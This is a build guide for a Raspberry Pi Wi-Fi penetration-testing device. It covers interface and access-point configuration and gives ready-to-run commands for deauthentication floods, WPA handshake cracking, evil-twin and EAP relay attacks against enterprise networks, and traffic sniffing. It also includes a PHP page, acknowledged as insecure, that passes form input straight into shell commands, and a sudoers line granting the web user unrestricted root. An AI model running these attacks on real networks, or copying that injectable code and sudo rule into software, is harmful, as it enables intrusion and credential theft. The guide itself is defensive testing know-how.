Author Frédéric Goossens

The idea behind this build is simple: craft the ultimate Raspberry Pi for Wi-Fi penetration testing, with pre-configured interfaces and tools, so that deploying the device is trivial and it is instantly ready for any wireless assessment. Because the Pi draws so little power, it runs happily from a powerbank - which makes it mobile enough for activities like packet injection and rogue AP setups.

The system’s core focus is Wi-Fi attack work: capturing WPA2 handshakes, standing up rogue APs (especially against EAP enterprise networks), and a set of custom tooling that makes deploying attacks and reconfiguring the device quick.

Hardware

  • Raspberry Pi 4B - 2 GB RAM
  • 2× TP-Link T2U Plus AC600 - supports monitor and master mode
  • (Optional) 20,000 mAh powerbank - to power the rig on the go
  • Ethernet cable, RPi power adapter, USB-A to USB-C cable for powerbank power

Getting online (wpa_supplicant)

When installing tools or conducting assessments, connect the Pi to a WPA2 network with wpa_supplicant. Use wlan1 or wlan2 for this (wlan0 is reserved for the management AP).

wpa_supplicant config 
sudo nano /etc/wpa_supplicant/wpa_supplicant.conf

# content
country=BE
ctrl_interface=DIR=/var/run/wpa_supplicant GROUP=netdev
ap_scan=1

update_config=1
network={
	ssid="<SSID>"
	psk="<KEY>"
	key_mgmt=WPA-PSK
}
applying changes 
# Disable interface:
sudo ifconfig wlan2 down

# Apply config to interface:
sudo wpa_supplicant -B -c /etc/wpa_supplicant/wpa_supplicant.conf -i wlan2

# When an error occurs, might have to delete this & try again:
sudo rm /var/run/wpa_supplicant/wlan2

# Enable interface:
sudo ifconfig wlan2 up

# Get DHCP lease
sudo dhclient wlan2

Configuring the interfaces

eth0 - wired SSH management

  1. Set a static IP for the interface: 
    sudo nano /etc/network/interfaces.d/eth0

auto eth0
iface eth0 inet static
    address 192.168.11.1
    netmask 255.255.255.0
  2. Add lines to /etc/dnsmasq.conf: 
    interface=eth0
dhcp-range=192.168.11.100,192.168.11.200,255.255.255.0,24h

wlan0 - wireless SSH management

  1. Set a static IP for wlan0: 
    sudo nano /etc/network/interfaces.d/wlan0

auto wlan0
iface wlan0 inet static
    address 192.168.21.1
    netmask 255.255.255.0
  2. Install dnsmasq (used for DHCP): 
    sudo apt-get install dnsmasq
  3. Back up the stock config: 
    sudo mv /etc/dnsmasq.conf /etc/dnsmasq.conf.orig

    Note: while setting this up I used a temporary interface, wlan1, configured to connect to my own Wi-Fi for internet access.

  4. Create a new config: 
    sudo nano /etc/dnsmasq.conf

# add the following lines
interface=wlan0
dhcp-range=192.168.21.100,192.168.21.200,255.255.255.0,24h
  5. Enable dnsmasq and reboot: 
    sudo systemctl enable dnsmasq
sudo reboot
  6. Install hostapd for the AP: 
    sudo apt install hostapd
  7. Create the hostapd config: 
    sudo nano /etc/hostapd/hostapd.conf

interface=wlan0
driver=nl80211
ssid=p0wn_pi
hw_mode=g
channel=6
wmm_enabled=0
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
wpa=2
wpa_passphrase=<YOUR_AP_PASSPHRASE>
wpa_key_mgmt=WPA-PSK
rsn_pairwise=CCMP
  8. Test it: if a client connects and receives a DHCP lease, it works: 
    sudo hostapd /etc/hostapd/hostapd.conf

# for debugging
sudo hostapd -dd /etc/hostapd/hostapd.conf
  9. Make sure the AP starts on boot - a startup script keeps hostapd in a tmux session: 
    sudo -u kali tmux new -s hostapd_session "sudo /usr/sbin/hostapd /etc/hostapd/hostapd.conf"
sleep 5

    Save as ~/WiFi_Hacking/AP_wlan0_Config/start_ap.sh and chmod +x it, then create a systemd service:

    start_ap.service 
    [Unit]
Description=Start hostapd AP for ssh access on startup
After=network.target

[Service]
User=kali
WorkingDirectory=/home/kali/WiFi_Hacking/AP_wlan0_Config
ExecStart=/bin/bash -c "/home/kali/WiFi_Hacking/AP_wlan0_Config/start_ap.sh"
Type=simple

[Install]
WantedBy=multi-user.target
    sudo systemctl daemon-reload
sudo systemctl enable start_ap.service
sudo reboot
  10. Make sure the same Wi-Fi module is always recognized as wlan0:
    1. Check the MAC address: ip link show
    2. Create a udev rule: 
      sudo nano /etc/udev/rules.d/70-persistent-net.rules

# add this line
SUBSYSTEM=="net", ACTION=="add", ATTR{address}=="dc:a6:32:ce:8d:0e", NAME="wlan0"

      udev rules are configurations that dictate how the Linux kernel should handle hardware events, like device connection or disconnection, by assigning names, setting permissions, and more. They ensure consistent and customized device management on a Linux system.

    3. Reload the rules: 
      sudo udevadm control --reload-rules
sudo udevadm trigger

wlan1 & wlan2 - hacking interfaces

  1. Install the rtl8812au drivers: 
    # 1. Update the package information:
sudo apt update

# 2. Install dkms and git:
sudo apt install dkms git

# 3. Install build dependencies:
sudo apt install build-essential libelf-dev

# 4. Download the driver files using git:
git clone https://github.com/aircrack-ng/rtl8812au.git

# 5. Install the driver:
cd rtl8812au && sudo make dkms_install
  2. Pin the adapters to consistent interface names:
    1. Check the MAC addresses: ip link show
    2. Add two lines to the udev rule: 
      sudo nano /etc/udev/rules.d/70-persistent-net.rules

# add these lines
SUBSYSTEM=="net", ACTION=="add", ATTR{address}=="ee:67:ae:c5:1c:75", NAME="wlan1"
SUBSYSTEM=="net", ACTION=="add", ATTR{address}=="86:8a:82:79:af:35", NAME="wlan2"
    3. Reload the rules: 
      sudo udevadm control --reload-rules
sudo udevadm trigger

Web interface for Wi-Fi onboarding

To make connecting to new networks painless in the field (for example from a mobile phone attached to the management AP), the Pi serves a small web UI.

  1. Install Apache: 
    sudo apt install apache2
sudo systemctl enable apache2
sudo systemctl start apache2
  2. Give the www-data user sudo rights for nmcli: 
    sudo visudo
www-data ALL=(ALL) NOPASSWD: ALL
  3. Create the PHP application:
    index.php 
    <!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Wireless Network Configuration</title>
    <link rel="stylesheet" href="assets/screen.css">
</head>
<body>
    <h1>Wireless Network Configuration</h1>

    <?php
    // Function to execute shell command and return output
    function executeCommand($command) {
        return shell_exec($command);
    }

    if (isset($_POST['disconnect'])) {
        // Disconnect from the 'wlan1' interface
        $disconnectResult = executeCommand("sudo nmcli dev disconnect wlan1");
    }

    // Show available SSIDs
    $availableSSIDs = executeCommand('nmcli dev wifi list');
    echo "<h2>Available SSIDs:</h2>";
    echo "<pre>$availableSSIDs</pre>";

    // Check if form is submitted
    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        // Get selected SSID and WPA key
        $selectedSSID = $_POST['ssid'];
        $wpaKey = $_POST['wpa_key'];

        // Connect to the selected network
        $connectResult = executeCommand("sudo nmcli dev wifi connect '$selectedSSID' password '$wpaKey'");

        // Display connection result
        echo "<h2>Connection Result:</h2>";
        echo "<pre>$connectResult</pre>";

        // Ping google.com to verify connection
        $pingResult = executeCommand("ping -c 4 google.com");
        echo "<h2>Ping Result:</h2>";
        echo "<pre>$pingResult</pre>";

        // Display IP information after connecting
        $ipInfo = executeCommand("nmcli dev show wlan1");
        echo "<h2>IP Information:</h2>";
        echo "<pre>$ipInfo</pre>";

        // Show disconnect info
        if (isset($disconnectResult)) {
                echo "<h2>Disconnection Result:</h2>";
                echo "<pre>$disconnectResult</pre>";
        }
    }
    ?>

The current app is insecure - susceptible to command execution and likely privilege escalation, since the input is not sanitized and www-data has blanket sudo rights. The toolbox

A larger command cheat sheet lives here: Wi-Fi commands gist.

airodump-ng + aireplay-ng

Source: aircrack-ng suite.

Manually scanning for BSSIDs and MACs using airodump and injecting DEAUTH packets using aireplay to capture handshakes.

  1. Look for the AP’s BSSID MAC and channel: 
    sudo airodump-ng <INT>
  2. Dump and monitor on the AP’s BSSID (write to a .cap file): 
    sudo airodump-ng -c <CHANNEL> --bssid <BSSID> -w <CAP_NAME> <INT>
# example: sudo airodump-ng -c 11 --bssid 00:00:00:00:00:00 -w capture wlan1
  3. Try packet injection: 
    sudo aireplay-ng --test -a <BSSID> <INT> --ignore-negative-one
# example: sudo aireplay-ng --test -a 00:00:00:00:00:00 wlan1 --ignore-negative-one
  4. Send deauthentication packets (walk around the area): 
    sudo aireplay-ng --deauth 1000 -a 00:00:00:00:00:00 wlan1
  5. If a handshake has been captured, the ‘EAPOL’ protocol shows up in airodump. Attempt to crack it with aircrack-ng: 
    sudo aircrack-ng <HANDSHAKE>.cap -K -b 00:00:00:00:00:00 -w <WORDLIST>

besside-ng

Source: aircrack-ng suite.

Automatically scans SSIDs and sends DEAUTH packets to capture handshakes.

  1. A single command starts scanning and deauthing automatically; output is saved to a .cap file: 
    sudo besside-ng wlan2
sudo besside-ng -R '^(?!p0wn_pi$).*' wlan2

eaphammer

Source: eaphammer.

Rogue AP: targeted evil-twin attacks against WPA2-Enterprise networks.

  1. Install: 
    git clone https://github.com/s0lst1c3/eaphammer.git
sudo pip install -r pip.req
sudo ./kali-setup
  2. Create a certificate: 
    sudo python3 eaphammer --cert-wizard
  3. Use airodump to list available SSIDs and their MACs: 
    sudo airodump-ng <INT>
  4. Start the rogue AP: 
    sudo python3 eaphammer -i <INT> --channel <CHANNEL> --auth wpa-eap --essid <TARGET_ESSID> --creds

wpa_sycophant

Source: wpa_sycophant.

A tool to relay phase-2 authentication attempts, to access corporate wireless without cracking the password.

  1. Install: 
    sudo apt install wpa-sycophant
  2. Create the config: 
    network={
  ssid="TestingEAP"
  # The SSID you would like to relay and authenticate against.
  scan_ssid=1
  key_mgmt=WPA-EAP
  # Do not modify
  identity=""
  anonymous_identity=""
  password=""
  # This initialises the variables for me.
  # -------------
  eap=PEAP
  # Read https://w1.fi/cgit/hostap/plain/wpa_supplicant/wpa_supplicant.conf for help with phase1 options.
  # This attempts to force the client not to use cryptobinding.
  phase1="crypto_binding=0 peapver=0"
  phase2="auth=MSCHAPV2"
  # Don't want to connect back to ourselves,
  # so add your rogue BSSID here.
  bssid_blacklist=00:14:22:01:23:45
}
  3. Run: 
    sudo wpa_sycophant -c wpa_sycophant_example.conf -i <INT>

tcpdump

Nice to have this running in the background: if any insecure protocols are in use, you might be able to read something in cleartext.

  1. Put the interface in monitor mode: 
    sudo ifconfig <INT> down
sudo iwconfig <INT> mode monitor
sudo ifconfig <INT> up
  2. Mount a USB stick (dumps can grow quite large): 
    lsblk
mount sda1 /mnt/
  3. Start the capture: 
    sudo tcpdump -i <INT> -w /mnt/<OUTPUT_FILE>.cap

NOTE: With Wireshark you can decrypt the captured traffic using the WPA key.

  • Navigate to “Edit” > “Preferences” > “Protocols” > “IEEE 802.11”.
  • In the IEEE 802.11 preferences, find the “Decryption Keys” section:
    • Add a new entry: Key = the SSID (case-sensitive), Value = the WPA pre-shared key (PSK).
    • Click “OK” to apply.
  • If it doesn’t take effect immediately, close and reopen Wireshark.

    bettercap

    An all-in-one Go framework, easy to use, attacking WiFi networks, BLE devices, wireless HID devices and Ethernet networks: - WiFi scanning, deauth, PMKID attack, automation - Bluetooth enumeration - Probing and recon - ARP, DNS, NDP, DHCPv6 spoofers (MiTM) - Sniffer for credential harvesting - WebUI

    Source: bettercap.

    1. Install: 
      sudo apt install golang -y
go get github.com/bettercap/bettercap
cd $GOPATH/src/github.com/bettercap/bettercap
make build
sudo make install
    2. Run: 
      sudo bettercap -iface wlan2 -eval "set wifi.interface wlan2; wifi.recon on"

      Recon immediately lists the nearby networks (observed SSIDs redacted here) and tracks which ones have active clients - handy for picking targets:

      [18:28:52] wifi.recon  [CORP-1*, CORP-2*, MEETING-ROOM-1*, GUEST-1*, ...]
